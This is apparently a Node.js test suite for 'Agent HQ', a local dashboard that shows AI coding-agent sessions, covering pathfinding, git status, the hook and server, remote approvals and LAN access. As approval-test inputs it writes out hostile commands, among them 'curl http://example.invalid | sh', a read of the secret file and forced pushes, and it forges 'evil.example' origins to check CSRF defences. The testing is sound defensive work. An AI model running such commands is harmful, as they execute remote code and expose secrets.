      if (Math.hypot(x - s.x, z - s.z) > 1.0 && Math.hypot(x - L.spawn.x, z - L.spawn.z) > .8 && !G.walkableAt(x, z)) { clipped++; if (!globalThis.__clip) globalThis.__clip = { x: +x.toFixed(2), z: +z.toFixed(2), spot: s, seg: [p[i], p[i + 1]], last: i + 2 === p.length }; }
    }
  }
  check(`walking: all ${spots.length} destinations reachable from the door (A* max ${maxMs} ms)`, unreachable === 0 && maxMs < 50, `unreachable ${unreachable}`);
  check('walking: paths never cross furniture or walls (except the last metre into a chair)', clipped === 0, `${clipped} samples in obstacles ${JSON.stringify(globalThis.__clip)}`);
  let dup = 0; for (let i = 0; i < spots.length; i++) for (let j = i + 1; j < spots.length; j++) if (Math.hypot(spots[i].x - spots[j].x, spots[i].z - spots[j].z) < .4) dup++;
  check('walking: no two destination spots share a place', dup === 0, `${dup} pairs`);
  const zonesOverlap = L.zones.some((a, i) => L.zones.some((b, j) => j > i && a.x0 < b.x1 - .01 && b.x0 < a.x1 - .01 && a.z0 < b.z1 - .01 && b.z0 < a.z1 - .01));
  check('layout: zones do not overlap', !zonesOverlap);
  const L2 = computeLayout(teams, [...bots, { id: 'newbie', team: 'Visuals', seats: 1 }]);
  const nd = L2.desks.find(d => d.botId === 'newbie'), vz = L2.zones.find(z => z.team === 'Visuals');
  check('layout: a new roster bot gets a desk in its team zone', nd && nd.desk.x > vz.x0 && nd.desk.x < vz.x1 && nd.desk.z > vz.z0 && nd.desk.z < vz.z1 && L2.desks.length === L.desks.length + 1);
  const G2 = new NavGrid(L2); check('layout: the new desk is reachable', !!G2.path(L2.spawn, nd.seat));
  // demo mode: the scripted 90 s day, on a fake clock; fetch throws, so any server call would fail the check
  {
    let fake = 0; const realPerf = globalThis.performance, realFetch = globalThis.fetch;
    Object.defineProperty(globalThis, 'performance', { value: { now: () => fake }, configurable: true, writable: true });
    let fetched = 0; globalThis.fetch = () => { fetched++; throw new Error('no network in demo'); };
    try {
      const { createDemo } = await import('file:///' + path.join(CODE, 'web', 'demo.js').replace(/\\/g, '/'));
      const world = { hourOverride: null }, seen = { waiting: 0, stuck: 0, running: 0, approvals: 0, meeting: 0 }, hours = []; let last = null;
      const demo = createDemo({ world, apply: st => { last = st; for (const k of ['waiting', 'stuck']) seen[k] = Math.max(seen[k], st.counts[k]); seen.running = Math.max(seen.running, st.bots.filter(x => x.status === 'running').length); seen.approvals = Math.max(seen.approvals, st.approvals.length); seen.meeting = Math.max(seen.meeting, ...st.bots.map(x => x.robots[0] ? x.robots[0].helpers.length : 0)); } });
      for (fake = 0; fake <= 90000; fake += 500) { demo.tick(); hours.push(world.hourOverride); }
      check('demo: 6 fake agents arrive, run commands, one waits at the kiosk (approval), one gets stuck, helpers meet', last.bots.length === 6 && seen.waiting === 1 && seen.stuck === 1 && seen.running >= 2 && seen.approvals === 1 && seen.meeting >= 2, JSON.stringify(seen));
      check('demo: by the end everybody finished and rests (9 cards for the Done board); day turns into night', last.finished.length === 9 && last.bots.every(x => x.status === 'resting') && hours[0] === 8 && hours[hours.length - 1] === 23 && last.demo === true, JSON.stringify({ fin: last.finished.length, st: last.bots.map(x => x.status), h: [hours[0], hours[hours.length - 1]] }));
      check('demo: uses no real data (no fetch, fake names only)', fetched === 0 && !last.bots.some(x => /nexus|locqa|tutor|scratch|hq/i.test(x.id)));
    } finally { Object.defineProperty(globalThis, 'performance', { value: realPerf, configurable: true, writable: true }); globalThis.fetch = realFetch; }
  }
  const { placeFor } = await import('file:///' + path.join(CODE, 'web', 'behavior.js').replace(/\\/g, '/'));
  check('behaviour: a new session (SessionStart, no prompt yet) walks straight to its desk, not the lounge', placeFor({ status: 'resting', turn: null }) === 'desk');
  check('behaviour: after Stop (prompted, then finished) it rests in the lounge', placeFor({ status: 'resting', turn: { requested: 1, done: 2 } }) === 'lounge');
  check('behaviour: waiting -> kiosk queue, working/running/stuck -> desk, 2+ helpers -> meeting, off -> door',
    placeFor({ status: 'waiting', turn: { requested: 1 } }) === 'queue' && ['working', 'running', 'stuck'].every(s => placeFor({ status: s, turn: { requested: 1 } }) === 'desk')
    && placeFor({ status: 'working', inMeeting: true }) === 'meeting' && placeFor({ status: 'working', leaving: true }) === 'door');
}

// ---------- git on desks (real temp repos: a bare "origin" + a working copy) ----------
const gitEnv = { ...process.env, GIT_AUTHOR_NAME: 'hq', GIT_AUTHOR_EMAIL: 'hq@example.invalid', GIT_COMMITTER_NAME: 'hq', GIT_COMMITTER_EMAIL: 'hq@example.invalid', GIT_CONFIG_NOSYSTEM: '1' };
const git = (dir, ...a) => spawnSync('git', ['-c', 'init.defaultBranch=main', '-c', 'core.autocrlf=false', ...a], { cwd: dir, env: gitEnv, encoding: 'utf8' });
const HAVE_GIT = spawnSync('git', ['--version']).status === 0;
function makeRepo(dir, { remote, unpushed = 0, dirtyOldFile = false, untracked = false } = {}) {
  fs.mkdirSync(dir, { recursive: true }); git(dir, 'init', '-q');
  fs.writeFileSync(path.join(dir, 'a.txt'), 'one'); git(dir, 'add', '.'); git(dir, 'commit', '-qm', 'first');
  if (remote) { fs.mkdirSync(path.dirname(remote), { recursive: true }); git(path.dirname(remote), 'init', '-q', '--bare', remote); git(dir, 'remote', 'add', 'origin', remote); git(dir, 'push', '-q', '-u', 'origin', 'main'); }
  for (let i = 0; i < unpushed; i++) { fs.writeFileSync(path.join(dir, 'c' + i + '.txt'), 'x'); git(dir, 'add', '.'); git(dir, 'commit', '-qm', 'c' + i); }
  if (dirtyOldFile) { fs.writeFileSync(path.join(dir, 'a.txt'), 'changed'); const old = (Date.now() - 3 * 3600000) / 1000; fs.utimesSync(path.join(dir, 'a.txt'), old, old); }
  if (untracked) fs.writeFileSync(path.join(dir, 'new file.txt'), 'u');
}
if (HAVE_GIT) makeRepo(cwd('proj/nexus'), { remote: path.join(HOME, 'remotes', 'nexus.git'), unpushed: 1, dirtyOldFile: true, untracked: true });
async function gitChecks() {
  const { gitStatus, parseStatus } = require('./git');
  if (!HAVE_GIT) { console.log('SKIP  git checks (git not installed)'); return; }
  const g = await gitStatus(cwd('proj/nexus'));
  check('git: branch, uncommitted files (incl. untracked with spaces), unpushed commits', g && g.branch === 'main' && g.changed === 2 && g.unpushed === 1 && g.upstream === 'origin/main', JSON.stringify(g));
  check('git: uncommitted work older than 2 h -> orange dot (dirtyOld)', g && g.dirtyOld === true && g.dirtySince < Date.now() - 2 * 3600000);
  const local = path.join(HOME, 'proj', 'localonly'); makeRepo(local, { unpushed: 2 });
  const gl = await gitStatus(local);
  check('git: no upstream -> commits not on any remote count as unpushed; clean tree', gl && gl.changed === 0 && gl.unpushed === 3 && gl.dirtyOld === false, JSON.stringify(gl));
  check('git: a folder that is not a repo gives null', (await gitStatus(cwd('proj/tutor'))) === null);
  const p = parseStatus(['# branch.oid abc', '# branch.head feat/x', '# branch.upstream origin/feat/x', '# branch.ab +3 -1', '2 R. N... 100644 100644 100644 aaa bbb R100 new name.js', 'old name.js', 'u UU N... 100644 100644 100644 100644 a b c conflict.js', ''].join('\0'));
  check('git: porcelain v2 parse (rename + conflict, ahead/behind)', p.branch === 'feat/x' && p.ahead === 3 && p.behind === 1 && p.changed === 2 && p.files[0] === 'new name.js' && p.files[1] === 'conflict.js', JSON.stringify(p));
  const before = git(cwd('proj/nexus'), 'status', '--porcelain').stdout;
  check('git: status is read-only (no index.lock left, worktree unchanged)', !fs.existsSync(path.join(cwd('proj/nexus'), '.git', 'index.lock')) && before.split('\n').filter(Boolean).length === 2);
}

// ---------- hook + server (real processes, temp home, test port) ----------
const PORT = 7791;
const env = { ...process.env, USERPROFILE: HOME, HOME, AGENT_HQ_GIT_MS: '2000', AGENT_HQ_NO_AUTOREPORT: '1', AGENT_HQ_APPROVAL_WAIT_MS: '4000', AGENT_HQ_PORT: String(PORT), AGENT_HQ_NO_TOAST: '1', AGENT_HQ_DRYRUN_OPEN: '1' };
const runHook = (input, extra = {}) => { const t0 = Date.now(); const r = spawnSync(process.execPath, [path.join(CODE, 'hook.js')], { input, env: { ...env, ...extra }, timeout: 5000 }); return { ms: Date.now() - t0, code: r.status }; };
const bad = runHook('not json at all');
check('hook: garbage input exits 0', bad.code === 0);
const h1 = runHook(JSON.stringify({ hook_event_name: 'UserPromptSubmit', session_id: 'hk', cwd: cwd('proj/nexus'), transcript_path: txp('hk') }), { AGENT_HQ_NO_AUTOSTART: '1' });
const monthFile = path.join(HQ, `events-${monthKey(Date.now())}.jsonl`);
const lastLine = fs.existsSync(monthFile) ? JSON.parse(fs.readFileSync(monthFile, 'utf8').trim().split('\n').pop()) : {};
check('hook: writes to the monthly file with bot name', h1.code === 0 && lastLine.session_id === 'hk' && lastLine.bot === 'Nexus');
const hs = runHook(JSON.stringify({ hook_event_name: 'SessionStart', session_id: 'boot', cwd: cwd('proj/locqa') }));
check(`hook: SessionStart with server down returns fast (${hs.ms} ms incl. node startup)`, hs.code === 0 && hs.ms < 1200);

function req(method, p, { headers = {}, body } = {}) {
  return new Promise(resolve => {
    const r = http.request({ host: '127.0.0.1', port: PORT, path: p, method, headers: { Host: `127.0.0.1:${PORT}`, ...headers }, timeout: 3000 }, res => {
      let b = ''; res.on('data', d => b += d); res.on('end', () => { let j = null; try { j = JSON.parse(b); } catch (e) {} resolve({ code: res.statusCode, json: j }); });
    });
    r.on('error', () => resolve({ code: 0 })); r.on('timeout', () => { r.destroy(); resolve({ code: 0 }); });
    if (body) r.write(body); r.end();
  });
}
// ---------- approvals from the office (real hook process + real server) ----------
function hookAsync(input) {
  return new Promise(resolve => {
    const t0 = Date.now(), p = spawn(process.execPath, [path.join(CODE, 'hook.js')], { env: { ...env, AGENT_HQ_NO_AUTOSTART: '1' } });
    let out = ''; p.stdout.on('data', d => out += d); p.on('close', code => resolve({ code, out, ms: Date.now() - t0 }));
    p.stdin.end(JSON.stringify(input));
  });
}
async function approvalChecks(json) {
  const ORIGIN = `http://127.0.0.1:${PORT}`, sid = 'perm-1';
  const permInput = cmd => ({ hook_event_name: 'PermissionRequest', session_id: sid, cwd: cwd('proj/locqa'), transcript_path: txp(sid), permission_mode: 'default', tool_name: 'Bash', tool_input: { command: cmd, description: 'x' } });
  runHook(JSON.stringify({ hook_event_name: 'UserPromptSubmit', session_id: sid, cwd: cwd('proj/locqa'), transcript_path: txp(sid) }), { AGENT_HQ_NO_AUTOSTART: '1' });
  // off (default): the hook logs and returns at once with no output -> Claude Code shows its own prompt
  const off = await hookAsync(permInput('git push --force origin main'));
  check(`approvals off: hook returns nothing, fast (${off.ms} ms)`, off.code === 0 && off.out === '' && off.ms < 1500, JSON.stringify(off));
  let st = null;
  for (let i = 0; i < 20; i++) { st = (await req('GET', '/state')).json; if (st && st.waiting.some(w => /git push --force origin main/.test(w.message))) break; await new Promise(r => setTimeout(r, 200)); }
  check('PermissionRequest shows "waiting" at once with the tool + command', st && st.waiting.some(w => w.botId === 'locqa' && /Wants to use Bash: git push --force origin main/.test(w.message)) && st.approvals.length === 0 && st.approvalsOn === false, JSON.stringify(st && st.waiting));
  const secret = fs.readFileSync(path.join(HQ, 'secret'), 'utf8').trim();
  check('secret: random per install, 64 hex chars, file ~/.agent-hq/secret', /^[0-9a-f]{64}$/.test(secret));
  const tokOff = await req('GET', '/api/approvals/token');
  check('token is not handed out while approvals are off', tokOff.json && tokOff.json.token === null);
  const r0 = await req('POST', '/api/approvals/request', { headers: { ...json, 'X-HQ-Secret': 'nope' }, body: '{}' });
  const r1 = await req('POST', '/api/approvals/request', { headers: { ...json, 'X-HQ-Secret': secret, Origin: ORIGIN }, body: '{}' });
  check('request endpoint: wrong secret or any browser Origin refused', r0.code === 403 && r1.code === 403);
  // on
  spawnSync(process.execPath, [path.join(CODE, 'cli.js'), 'approvals', 'on'], { env, encoding: 'utf8' });
  const set = JSON.parse(fs.readFileSync(path.join(HQ, 'settings.json'), 'utf8'));
  check('agent-hq approvals on: settings.approvals.enabled, LAN off', set.approvals && set.approvals.enabled === true && set.approvals.lan === false);
  await new Promise(r => setTimeout(r, 400));
  const waitFor = async fn => { for (let i = 0; i < 40; i++) { const x = (await req('GET', '/state')).json; const v = x && fn(x); if (v) return v; await new Promise(r => setTimeout(r, 100)); } return null; };
  // allow once
  const pa = hookAsync(permInput('rm -rf build && npm run build -- --prod'));
  const a1 = await waitFor(x => x.approvals.find(a => /npm run build -- --prod/.test(a.detail)));
  check('approval listed in /state with tool + full command + robot key', a1 && a1.tool === 'Bash' && a1.detail === 'rm -rf build && npm run build -- --prod' && a1.robot === 'session:' + sid, JSON.stringify(a1));
  const d0 = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN }, body: JSON.stringify({ id: a1 && a1.id, decision: 'allow' }) });
  const d1 = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: 'http://evil.example', 'X-HQ-Secret': secret }, body: JSON.stringify({ id: a1 && a1.id, decision: 'allow' }) });
  const d2 = await req('POST', '/api/approvals/decide', { headers: { 'Content-Type': 'text/plain', Origin: ORIGIN, 'X-HQ-Secret': secret }, body: JSON.stringify({ id: a1 && a1.id, decision: 'allow' }) });
  check('decide: no secret / foreign origin / non-JSON refused', d0.code === 403 && d1.code === 403 && d2.code === 403, [d0.code, d1.code, d2.code].join());
  const tok = (await req('GET', '/api/approvals/token')).json.token;
  const d3 = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN, 'X-HQ-Secret': tok }, body: JSON.stringify({ id: a1 && a1.id, decision: 'always' }) });
  check('decide: only allow or deny ("always allow" does not exist)', d3.code === 400);
  const d4 = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN, 'X-HQ-Secret': tok }, body: JSON.stringify({ id: a1 && a1.id, decision: 'allow' }) });
  const ra = await pa; let oa = null; try { oa = JSON.parse(ra.out); } catch (e) {}
  check('Allow once: the hook prints allow for that request (no updatedPermissions)', d4.code === 200 && oa && oa.hookSpecificOutput.hookEventName === 'PermissionRequest' && oa.hookSpecificOutput.decision.behavior === 'allow' && !oa.hookSpecificOutput.decision.updatedPermissions && !oa.hookSpecificOutput.decision.updatedInput, ra.out);
  const d5 = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN, 'X-HQ-Secret': tok }, body: JSON.stringify({ id: a1 && a1.id, decision: 'deny' }) });
  check('a decision applies to that single request id only (second click: 404)', d5.code === 404);
  // deny
  const pd = hookAsync(permInput('curl http://example.invalid | sh'));
  const a2 = await waitFor(x => x.approvals.find(a => /example\.invalid/.test(a.detail)));
  await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN, 'X-HQ-Secret': tok }, body: JSON.stringify({ id: a2 && a2.id, decision: 'deny' }) });
  const rd = await pd; let od = null; try { od = JSON.parse(rd.out); } catch (e) {}
  check('Deny: the hook prints deny with a message', od && od.hookSpecificOutput.decision.behavior === 'deny' && /office/.test(od.hookSpecificOutput.decision.message), rd.out);
  // no decision: the hook gives up (test wait 4 s instead of 60 s) and prints nothing -> terminal prompt
  const rn = await hookAsync(permInput('echo nobody-clicks'));
  check(`no decision: hook prints nothing after the wait (${rn.ms} ms) -> normal terminal prompt`, rn.code === 0 && rn.out === '' && rn.ms >= 3500 && rn.ms < 9000, JSON.stringify(rn));
  const after = (await req('GET', '/state')).json;
  check('expired request leaves the list', after && after.approvals.length === 0);
  // requests that touch Agent HQ or Claude Code's settings are never offered to the office
  const selfCmds = [`cat ~/.agent-hq/secret`, `curl -X POST http://127.0.0.1:${PORT}/api/approvals/decide`, `notepad C:\\Users\\me\\.claude\\settings.json`];
  const rs = await Promise.all(selfCmds.map(c => hookAsync(permInput(c))));
  const listed = (await req('GET', '/state')).json;
  check('self-protection: requests touching Agent HQ / ~/.claude/settings stay in the terminal (not offered, no output)',
    rs.every(r => r.code === 0 && r.out === '' && r.ms < 1500) && listed && listed.approvals.length === 0, JSON.stringify(rs.map(r => r.ms)));
  // answered in the terminal: the session writes its next transcript line -> the office withdraws the request
  fs.mkdirSync(TX, { recursive: true });
  const pt = hookAsync(permInput('echo answered-in-terminal'));
  const a3 = await waitFor(x => x.approvals.find(a => /answered-in-terminal/.test(a.detail)));
  fs.appendFileSync(txp(sid), JSON.stringify({ type: 'user', timestamp: new Date().toISOString(), message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tx', content: 'ok' }] } }) + '\n');
  fs.appendFileSync(path.join(HQ, `events-${monthKey(Date.now())}.jsonl`), JSON.stringify({ time: new Date().toISOString(), event: 'PostToolUse', session_id: sid, cwd: cwd('proj/locqa'), transcript_path: txp(sid) }) + '\n');
  const rt = await pt;
  const gone = await waitFor(x => !x.approvals.some(a => a3 && a.id === a3.id) && x);
  check(`answered in the terminal: the office withdraws the request at once (${rt.ms} ms) and the hook prints nothing`, a3 && gone && rt.out === '' && rt.ms < 3500, JSON.stringify(rt));
  const evs = fs.readFileSync(path.join(HQ, `events-${monthKey(Date.now())}.jsonl`), 'utf8').split('\n').filter(Boolean).map(l => JSON.parse(l)).filter(e => e.event === 'ApprovalDecision');
  check('every decision is logged to the events file (allow, deny, timeout)', evs.some(e => e.decision === 'allow' && e.by === 'office' && e.request_id === a1.id) && evs.some(e => e.decision === 'deny') && evs.some(e => e.decision === 'none' && e.by === 'timeout') && evs.some(e => e.by === 'answered-elsewhere') && evs.every(e => e.session_id === sid && e.tool_name === 'Bash'), JSON.stringify(evs));
  spawnSync(process.execPath, [path.join(CODE, 'cli.js'), 'approvals', 'off'], { env, encoding: 'utf8' });
  await new Promise(r => setTimeout(r, 400));
  const doff = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN, 'X-HQ-Secret': tok }, body: JSON.stringify({ id: 'x', decision: 'allow' }) });
  check('approvals off again: decide refused', doff.code === 409, String(doff.code));
}

// ---------- LAN mode (phone): token link, cookie, read-only, approvals only with --lan ----------
function lreq(ip, method, p, { headers = {}, body } = {}) {
  return new Promise(resolve => {
    const r = http.request({ host: ip, port: PORT, path: p, method, headers: { Host: `${ip}:${PORT}`, ...headers }, timeout: 3000 }, res => {
      let b = ''; res.on('data', d => b += d); res.on('end', () => { let j = null; try { j = JSON.parse(b); } catch (e) {} resolve({ code: res.statusCode, headers: res.headers, json: j, body: b }); });
    });
    r.on('error', e => resolve({ code: 0, err: e.code })); r.on('timeout', () => { r.destroy(); resolve({ code: 0, err: 'timeout' }); });
    if (body) r.write(body); r.end();
  });
}
async function lanChecks(json) {
  const { qrMatrix } = require('./qr');
  const qm = qrMatrix('http://192.168.0.10:7777/?t=0123456789abcdef0123456789abcdef');
  const qh = require('crypto').createHash('sha256').update(qm.map(r => r.map(c => (c ? 1 : 0)).join('')).join('\n')).digest('hex');
  // reference matrix: decoded correctly by zxing-cpp when this encoder was written (9/9 test strings, versions 1-10)
  check('QR encoder: version 4 for a LAN link, same modules as the decoder-verified reference', qm.length === 33 && qh === 'de6907863bdd2d0cc9c05d97a63631f6c5ae8d65e30702e23efd5799417bec53', qh);
  const { pickLanIp } = require('./lan'), ip = pickLanIp();
  if (!ip) { console.log('SKIP  LAN checks (no private IPv4 address on this machine)'); return; }
  const settingsFile = path.join(HQ, 'settings.json'), token = 'ab'.repeat(16);
  const setS = fn => { const x = JSON.parse(fs.readFileSync(settingsFile, 'utf8')); fn(x); fs.writeFileSync(settingsFile, JSON.stringify(x)); };
  setS(x => { x.lan = { enabled: true, token }; });
  let up = null; for (let i = 0; i < 30; i++) { up = await lreq(ip, 'GET', '/'); if (up.code) break; await new Promise(r => setTimeout(r, 150)); }
  check(`LAN on: listens on ${ip}:${PORT}; without the token -> 401`, up && up.code === 401, JSON.stringify(up && { code: up.code, err: up.err }));
  const bad = await lreq(ip, 'GET', '/?t=' + 'cd'.repeat(16));
  const good = await lreq(ip, 'GET', '/?t=' + token);
  const ck = String((good.headers || {})['set-cookie'] || '');
  check('LAN: wrong token 401; right token -> cookie (HttpOnly, SameSite=Strict) + redirect to the mobile page', bad.code === 401 && good.code === 302 && /HttpOnly/.test(ck) && /SameSite=Strict/.test(ck) && good.headers.location === '/?m=1', ck);
  const C = { Cookie: 'hq_lan=' + token };
  const st = await lreq(ip, 'GET', '/state', { headers: C });
  check('LAN: /state works with the cookie, viewer is read-only', st.code === 200 && st.json.viewer.lan === true && st.json.viewer.canControl === false && st.json.viewer.canApprove === false, JSON.stringify(st.json && st.json.viewer));
  const evilHost = await lreq(ip, 'GET', '/state', { headers: { ...C, Host: 'evil.example:' + PORT } });
  const hp = await lreq(ip, 'GET', '/api/health', { headers: C }), tk = await lreq(ip, 'GET', '/api/approvals/token', { headers: C });
  check('LAN: foreign Host refused; health/token endpoints closed to the phone', evilHost.code === 403 && hp.code === 403 && tk.code === 403);
  const O = { ...C, ...json, Origin: `http://${ip}:${PORT}` };
  const mute = await lreq(ip, 'POST', '/api/mute', { headers: O, body: '{"muted":true}' });
  const open = await lreq(ip, 'POST', '/api/open', { headers: O, body: '{"botId":"nexus"}' });
  const hookReq = await lreq(ip, 'POST', '/api/approvals/request', { headers: { ...C, ...json, 'X-HQ-Secret': fs.readFileSync(path.join(HQ, 'secret'), 'utf8').trim() }, body: '{}' });
  check('LAN: read-only (mute, open folder, hook endpoint refused)', mute.code === 403 && open.code === 403 && hookReq.code === 403, [mute.code, open.code, hookReq.code].join());
  // approvals from the phone only with "approvals on --lan"
  spawnSync(process.execPath, [path.join(CODE, 'cli.js'), 'approvals', 'on'], { env, encoding: 'utf8' });
  await new Promise(r => setTimeout(r, 400));
  const secret = fs.readFileSync(path.join(HQ, 'secret'), 'utf8').trim();
  const sid = 'perm-1', permInput = cmd => ({ hook_event_name: 'PermissionRequest', session_id: sid, cwd: cwd('proj/locqa'), transcript_path: txp(sid), permission_mode: 'default', tool_name: 'Bash', tool_input: { command: cmd } });
  const p1 = hookAsync(permInput('echo from-phone'));
  let a = null; for (let i = 0; i < 40 && !a; i++) { const x = (await req('GET', '/state')).json; a = x && x.approvals.find(q => /from-phone/.test(q.detail)); if (!a) await new Promise(r => setTimeout(r, 100)); }
  const noLan = await lreq(ip, 'POST', '/api/approvals/decide', { headers: { ...O, 'X-HQ-Secret': secret }, body: JSON.stringify({ id: a && a.id, decision: 'allow' }) });
  check('LAN: approvals on (without --lan): the phone still cannot decide', noLan.code === 403, String(noLan.code));
  spawnSync(process.execPath, [path.join(CODE, 'cli.js'), 'approvals', 'on', '--lan'], { env, encoding: 'utf8' });
  await new Promise(r => setTimeout(r, 400));
  const tk2 = await lreq(ip, 'GET', '/api/approvals/token', { headers: C });
  const wrongOrigin = await lreq(ip, 'POST', '/api/approvals/decide', { headers: { ...O, Origin: 'http://127.0.0.1:' + PORT, 'X-HQ-Secret': secret }, body: JSON.stringify({ id: a && a.id, decision: 'allow' }) });
  const okLan = await lreq(ip, 'POST', '/api/approvals/decide', { headers: { ...O, 'X-HQ-Secret': tk2.json && tk2.json.token }, body: JSON.stringify({ id: a && a.id, decision: 'allow' }) });
  const r1 = await p1; let o1 = null; try { o1 = JSON.parse(r1.out); } catch (e) {}
  check('LAN: with approvals on --lan the phone can Allow once (LAN origin + secret), logged as "phone"', wrongOrigin.code === 403 && okLan.code === 200 && o1 && o1.hookSpecificOutput.decision.behavior === 'allow'
    && fs.readFileSync(path.join(HQ, `events-${monthKey(Date.now())}.jsonl`), 'utf8').includes('"by":"phone"'), [wrongOrigin.code, okLan.code, r1.out].join(' '));
  spawnSync(process.execPath, [path.join(CODE, 'cli.js'), 'approvals', 'off'], { env, encoding: 'utf8' });
  spawnSync(process.execPath, [path.join(CODE, 'cli.js'), 'lan', 'off'], { env, encoding: 'utf8' });
  let gone = null; for (let i = 0; i < 20; i++) { gone = await lreq(ip, 'GET', '/state', { headers: C }); if (!gone.code) break; await new Promise(r => setTimeout(r, 150)); }
  const lanSet = JSON.parse(fs.readFileSync(settingsFile, 'utf8')).lan;
  check('agent-hq lan off: LAN listener closed, token dropped', gone.code === 0 && lanSet.enabled === false && !lanSet.token, JSON.stringify(gone));
}

(async () => {
  try { await layoutChecks(); } catch (e) { check('layout/nav modules load in Node', false, e.message); }
  try { await gitChecks(); } catch (e) { check('git checks ran', false, e.stack); }
  let health = null;
  for (let i = 0; i < 40 && !(health && health.json); i++) { await new Promise(r => setTimeout(r, 150)); health = await req('GET', '/api/health'); }
  check('autostart: SessionStart hook spawned the server', health && health.json && health.json.ok && path.resolve(health.json.hq) === path.resolve(HQ), JSON.stringify(health && health.json));
  const st = await req('GET', '/state');
  check('server: /state answers (v3)', st.code === 200 && st.json && st.json.version === 3);
  // Server-Sent Events: append a hook event and expect a pushed patch with just that bot
  const sse = await new Promise(resolve => {
    let buf = '', done = false, sent = false; const finish = v => { if (!done) { done = true; try { r.destroy(); } catch (e) {} resolve(v); } };
    const r = http.get({ host: '127.0.0.1', port: PORT, path: '/events', headers: { Host: `127.0.0.1:${PORT}` } }, res => {
      res.on('data', d => {
        buf += d;
        if (buf.includes('event: hello') && !sent) {
          sent = true;
          fs.appendFileSync(path.join(HQ, `events-${monthKey(Date.now())}.jsonl`), JSON.stringify({ time: new Date().toISOString(), event: 'UserPromptSubmit', session_id: 'sse-1', cwd: cwd('proj/nexus'), transcript_path: txp('sse-1') }) + '\n');
        }
        for (const m of buf.split('\n\n')) { const line = m.split('\n').find(l => l.startsWith('data: ')); if (!line || /"version":3/.test(line)) continue; try { const p = JSON.parse(line.slice(6)); if ((p.bots || []).some(b => b.id === 'nexus')) finish(p); } catch (e) {} }
      });
    });
    r.on('error', e => finish({ err: e.message })); setTimeout(() => finish({ timeout: true, got: buf.slice(0, 300) }), 9000);
  });
  check('events stream (SSE): pushes only the changed bot after a new hook event', sse && sse.bots && sse.bots.length <= 2 && sse.bots.some(b => b.id === 'nexus') && typeof sse.seq === 'number' && sse.base === sse.seq - 1, JSON.stringify(sse).slice(0, 400));
  const h2 = await req('GET', '/api/health');
  check('server: idle CPU and memory reported', h2.json && typeof h2.json.cpuPercentSinceStart === 'number' && h2.json.watchers >= 1, JSON.stringify(h2.json));
  const evil = await req('GET', '/state', { headers: { Host: 'evil.example' } });
  check('server: foreign Host header refused', evil.code === 403);
  const json = { 'Content-Type': 'application/json' };
  const o1 = await req('POST', '/api/open', { headers: { ...json, Origin: 'http://evil.example' }, body: '{"botId":"nexus"}' });
  check('open-folder: cross-origin POST refused', o1.code === 403);
  const o2 = await req('POST', '/api/open', { headers: { ...json, Origin: `http://127.0.0.1:${PORT}` }, body: '{"botId":"../../windows"}' });
  check('open-folder: unknown bot refused', o2.code === 404);
  const o3 = await req('POST', '/api/open', { headers: { ...json, Origin: `http://127.0.0.1:${PORT}` }, body: '{"botId":"nexus"}' });
  check('open-folder: roster folder allowed (dry run)', o3.code === 200 && o3.json && path.resolve(o3.json.opened) === path.resolve(cwd('proj/nexus')));
  const o4 = await req('POST', '/api/open', { headers: { ...json, Origin: `http://127.0.0.1:${PORT}` }, body: '{"botId":"nexus","app":"vscode"}' });
  check('open in VS Code: roster folder allowed (dry run)', o4.code === 200 && o4.json && o4.json.app === 'vscode' && path.resolve(o4.json.opened) === path.resolve(cwd('proj/nexus')));
  const o5 = await req('POST', '/api/open', { headers: { ...json, Origin: `http://127.0.0.1:${PORT}` }, body: '{"botId":"researcher","app":"vscode"}' });
  check('open in VS Code: bot without a folder refused', o5.code === 404);
  if (HAVE_GIT) {
    let gs = null;
    for (let i = 0; i < 40 && !(gs && gs.git); i++) { const r = await req('GET', '/state'); gs = r.json && r.json.bots.find(b => b.id === 'nexus'); if (!(gs && gs.git)) await new Promise(r2 => setTimeout(r2, 250)); }
    check('server: git info on the bot in /state (background watcher)', gs && gs.git && gs.git.branch === 'main' && gs.git.changed === 2 && gs.git.unpushed === 1 && gs.git.dirtyOld, JSON.stringify(gs && gs.git));
  }
  const rp = await new Promise(resolve => { const r = http.get({ host: '127.0.0.1', port: PORT, path: '/report?fresh=1', headers: { Host: `127.0.0.1:${PORT}` }, timeout: 60000 }, res => { let b = ''; res.on('data', d => b += d); res.on('end', () => resolve({ code: res.statusCode, csp: res.headers['content-security-policy'], b })); }); r.on('error', () => resolve({ code: 0 })); });
  check('server: /report builds today\'s report in a child process (CSP: no scripts)', rp.code === 200 && /Agent HQ ·/.test(rp.b) && /default-src 'none'/.test(rp.csp || ''), rp.code + ' ' + String(rp.b).slice(0, 200));
  const rbad = await req('GET', '/report?date=../../x');
  check('server: /report rejects a bad date', rbad.code === 400);
  await approvalChecks(json);
  await lanChecks(json);
  const pidFile = path.join(HQ, `server-${PORT}.pid`);
  check('server: PID file written', fs.existsSync(pidFile) && +fs.readFileSync(pidFile, 'utf8') === health.json.pid);
  const stop = spawnSync(process.execPath, [path.join(CODE, 'cli.js'), 'stop'], { env, encoding: 'utf8', timeout: 10000 });
  const after = await req('GET', '/api/health');
  check('cli stop: kills the server and removes the PID file', after.code === 0 && !fs.existsSync(pidFile), stop.stdout + stop.stderr);

  const pass = results.filter(r => r.ok).length;
  console.log(`\n${pass}/${results.length} checks passed${pass === results.length ? '' : '  <-- FAILURES'}`);
  try { fs.rmSync(HOME, { recursive: true, force: true }); } catch (e) {}
  process.exitCode = pass === results.length ? 0 : 1;
})();
